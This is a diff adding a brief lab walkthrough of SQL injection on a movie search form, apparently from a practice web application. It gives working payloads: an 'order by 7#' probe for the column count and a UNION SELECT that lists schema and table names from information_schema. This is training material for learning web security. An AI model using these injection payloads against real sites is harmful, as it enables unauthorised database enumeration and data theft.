@@ -1,0 +1,21 @@
+                                     SQL_INJECTION_(POST/SEARCH)
+
+                                   * First go choose SQlinjection post/search 
+
+                                   *You can enter the movie name . 
+
+                                   *Now lets try our payload ======> 'order by 7# 
+
+                                    *now we know that we have 7 culomes 
+                                    * You can see that we could inject our sql .
+
+                                    *Then Using this SQL query we can get all of table schema and names from information_schema.tables 
+
+                                    ' and 1 = 0 union all select 1,table_schema,table_name,4,5,6,7 from information_schema.tables where 1=0 or 1=1#
+
+
+
+
+
+
+
